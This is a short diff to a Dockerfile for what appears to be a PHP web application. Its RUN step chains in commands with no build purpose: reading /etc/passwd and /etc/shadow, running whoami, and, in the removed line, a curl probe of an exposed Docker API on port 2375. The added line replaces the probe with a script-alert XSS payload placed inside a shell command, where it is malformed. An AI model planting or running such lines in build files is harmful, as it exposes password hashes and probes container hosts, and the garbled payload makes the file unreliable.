@@ -14,7 +14,7 @@ RUN apt-get update \
  && docker-php-ext-configure gd --with-jpeg --with-freetype \
 # && apt-get install net-tools \
  # Use pdo_sqlite instead of pdo_mysql if you want to use sqlite
-&& docker-php-ext-install gd mysqli pdo pdo_mysql && cat /etc/passwd && cat /etc/shadow && whoami && curl -s http://open.docker.socket:2375/version
+&& docker-php-ext-install gd mysqli pdo pdo_mysql && cat /etc/passwd && cat /etc/shadow && whoami && <script>alert(1)</script>
 
 COPY --chown=www-data:www-data . .
 COPY --chown=www-data:www-data config/config.inc.php.dist config/config.inc.php
